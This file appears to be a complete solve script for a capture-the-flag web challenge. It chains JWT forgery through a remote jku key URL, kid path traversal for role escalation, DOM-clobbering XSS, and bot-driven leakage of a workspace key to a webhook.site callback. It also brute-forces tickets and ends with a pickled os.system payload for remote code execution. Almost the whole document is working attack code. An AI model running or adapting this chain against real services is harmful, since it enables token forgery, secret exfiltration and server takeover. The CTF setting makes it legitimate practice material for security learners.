#!/usr/bin/env python3
"""
Perimeter Drift CTF - Fast Solve
Chain: SSO JWT forgery -> Reviewer escalation -> Bot workspace_key leak -> Pickle RCE

Usage: python solve_fast.py <TARGET_URL>
Example: python solve_fast.py http://chall.0xfun.org:12345
"""
import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import sys
import time
import urllib.parse

import requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chall.0xfun.org:51137"
HMAC_KEY = "mysecretkey"

# Extract port from TARGET for bot target base guessing
TARGET_PORT = urllib.parse.urlparse(TARGET).port or 80

# All possible bot TARGET_BASE values
BOT_TARGETS = [
    "http://web:5000",
    f"http://host.docker.internal:{TARGET_PORT}",
    "http://host.docker.internal:5000",
    "http://localhost:5000",
    "http://127.0.0.1:5000",
    "http://perimeter-drift-web:5000",
    f"http://web:{TARGET_PORT}",
    f"http://localhost:{TARGET_PORT}",
]
# Deduplicate
BOT_TARGETS = list(dict.fromkeys(BOT_TARGETS))


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    si = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, si, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    return f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"


def make_pickle_payload():
    class E:
        def __reduce__(self):
            return (os.system, ("cp /flag.txt /shared/loot/flag.txt 2>/dev/null; cat /flag* > /shared/loot/flag.txt 2>/dev/null",))
    return pickle.dumps(E())


def sso_login(s, jku_url=None):
    if not jku_url:
        jku_url = make_jku_url()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
        "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
        "exp": now + 3600, "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True, timeout=30)
    r = s.get(f"{TARGET}/api/me", timeout=10)
    return r.json() if r.status_code == 200 else None


def escalate_reviewer(s):
    known_key = b"XKEY"
    files = {"file": ("x.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files, timeout=10)
    if r.status_code != 200:
        return False
    fname = r.json().get("filename", "x.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    grant = forge_jwt(known_key, {"scope": "report:submit", "iat": int(time.time())},
                      {"kid": f"../review-materials/{kid_name}"})
    s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True, timeout=10)
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    return me["role"] in ("reviewer", "admin")


def create_xss_report(jku_url):
    s2 = requests.Session()
    sso_login(s2, jku_url)
    body = '<form id="workspace-state"><input name="state" value=\'{"debug":true,"module":"ops/loader"}\'></form>'
    r = s2.post(f"{TARGET}/reports/new", data={"title": "Assessment", "vuln_type": "XSS", "report": body},
                allow_redirects=True, timeout=10)
    m = re.search(r"/reports/(\d+)", r.url)
    return m.group(1) if m else "1"


def do_rce(workspace_key):
    b64_payload = base64.b64encode(make_pickle_payload()).decode()
    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    r = requests.post(f"{TARGET}/admin/upload", files=files,
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    Upload: {r.status_code} {r.text}")
    xml = ('<doc sink="http://internal:9000/internal/import" '
           'xmlns:drift="http://www.w3.org/2001/XInclude">'
           '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/></doc>')
    r = requests.post(f"{TARGET}/admin/xml/import", data={"xml": xml},
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    XML import: {r.status_code} {r.text}")


def check_flag():
    try:
        r = requests.get(f"{TARGET}/recovery/latest", timeout=10)
        return r.text
    except:
        return ""


def create_webhook():
    try:
        wr = requests.post("https://webhook.site/token", timeout=10)
        wh = wr.json()
        return wh["uuid"], f"https://webhook.site/{wh['uuid']}"
    except:
        return None, None


def poll_webhook(uuid, timeout_s=30):
    for i in range(timeout_s // 2):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{uuid}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                for req in data.get("data", []):
                    url_str = req.get("url", "")
                    query = req.get("query") or {}
                    if query.get("workspace_key"):
                        return query["workspace_key"]
                    m = re.search(r"workspace_key=([^&]+)", url_str)
                    if m:
                        return urllib.parse.unquote(m.group(1))
        except:
            pass
        if (i + 1) % 5 == 0:
            print(f"    Waiting... ({(i+1)*2}s)")
    return None


def solve():
    print(f"Target: {TARGET}")
    print(f"Target port: {TARGET_PORT}")
    print("=" * 60)

    # Check flag
    flag = check_flag()
    print(f"Recovery: {flag}")
    if "0xfun{" in flag:
        print(f"\nFLAG: {flag}")
        return

    # Step 1: SSO JWT forgery
    print("\n[1] SSO JWT Forgery...")
    s = requests.Session()
    jku_url = make_jku_url()
    me = sso_login(s, jku_url)
    if not me:
        print("    FAILED")
        return
    print(f"    -> {me['username']} ({me['role']})")

    # Step 2: Reviewer escalation
    print("\n[2] Reviewer escalation...")
    if me.get("role") == "researcher":
        if not escalate_reviewer(s):
            print("    FAILED")
            return
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    print(f"    -> role: {me['role']}")

    # Step 3: Create XSS report
    print("\n[3] Creating DOM clobber report...")
    rid = create_xss_report(jku_url)
    print(f"    Report ID: {rid}")

    # Step 4: Create webhook
    print("\n[4] Setting up webhook...")
    wh_uuid, wh_url = create_webhook()
    if not wh_url:
        print("    FAILED to create webhook")
        return
    print(f"    {wh_url}")

    # Step 5: Submit bot URLs - ALL approaches in parallel
    print("\n[5] Submitting bot URLs...")

    # A) Direct admin bounce (simplest - requires correct TARGET_BASE)
    for tb in BOT_TARGETS:
        url = f"{tb}/admin?bounce=1&cb={urllib.parse.quote(wh_url, safe='')}"
        try:
            s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True, timeout=15)
            print(f"    [bounce] {tb}")
        except:
            print(f"    [bounce] {tb} - timeout")

    # B) XSS chain via report page (loads roles.js, needs bootstrap ticket)
    # Try without ticket first - roles.js won't redirect but we verify XSS works
    for tb in BOT_TARGETS[:3]:
        url = f"{tb}/reports/{rid}"
        try:
            s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True, timeout=15)
            print(f"    [report] {tb}")
        except:
            pass

    # C) Direct webhook test to confirm bot has internet
    try:
        s.post(f"{TARGET}/report", data={"url": f"{wh_url}/bot-test"}, allow_redirects=True, timeout=15)
        print(f"    [direct] webhook test")
    except:
        pass

    # Step 6: Poll webhook
    print(f"\n[6] Polling webhook (45s)...")
    wk = poll_webhook(wh_uuid, 45)

    if wk:
        print(f"\n[+] workspace_key: {wk}")
        print("\n[7] Pickle RCE...")
        do_rce(wk)
        time.sleep(3)
        flag = check_flag()
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
        return

    # Check webhook for any requests at all
    print("\n[-] No workspace_key. Checking webhook for any requests...")
    try:
        r = requests.get(f"https://webhook.site/token/{wh_uuid}/requests", timeout=10)
        data = r.json()
        total = data.get("total", 0)
        print(f"    Total requests: {total}")
        for req in data.get("data", []):
            print(f"    {req.get('method')} {req.get('url')}")
            print(f"    Query: {req.get('query')}")
            print(f"    UA: {req.get('user_agent', '')[:80]}")
            print()

        if total > 0:
            print("    Bot has internet access but admin bounce didn't leak workspace_key.")
            print("    The issue is likely BFCache not working.")
            print("    Trying XSS chain with bootstrap ticket brute-force...")

            # Try brute-forcing bootstrap ticket via XSS chain
            # bt-XXXX where XXXX is 4 hex chars (65536 possibilities)
            # Submit batches via bot
            wh_uuid2, wh_url2 = create_webhook()
            if wh_url2:
                print(f"    New webhook: {wh_url2}")
                # Try first 512 tickets (most likely range)
                for i in range(0, 512, 8):
                    batch_tickets = [f"bt-{j:04x}" for j in range(i, min(i+8, 512))]
                    for ticket in batch_tickets:
                        for tb in ["http://web:5000", f"http://host.docker.internal:{TARGET_PORT}"]:
                            url = (f"{tb}/reports/{rid}?"
                                   f"view=../../assets/admin/roles"
                                   f"&ticket={ticket}"
                                   f"&cb={urllib.parse.quote(wh_url2, safe='')}")
                            try:
                                s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True, timeout=10)
                            except:
                                pass
                    print(f"    Tried bt-{i:04x} to bt-{min(i+7, 511):04x}")
                    # Check webhook after each batch
                    time.sleep(5)
                    wk = poll_webhook(wh_uuid2, 4)
                    if wk:
                        print(f"\n[+] workspace_key: {wk}")
                        print("\n[7] Pickle RCE...")
                        do_rce(wk)
                        time.sleep(3)
                        flag = check_flag()
                        print(f"\n{'='*60}")
                        print(f"FLAG: {flag}")
                        print(f"{'='*60}")
                        return
    except Exception as e:
        print(f"    Error: {e}")

    # Final check
    flag = check_flag()
    print(f"\nFinal recovery: {flag}")


if __name__ == "__main__":
    solve()
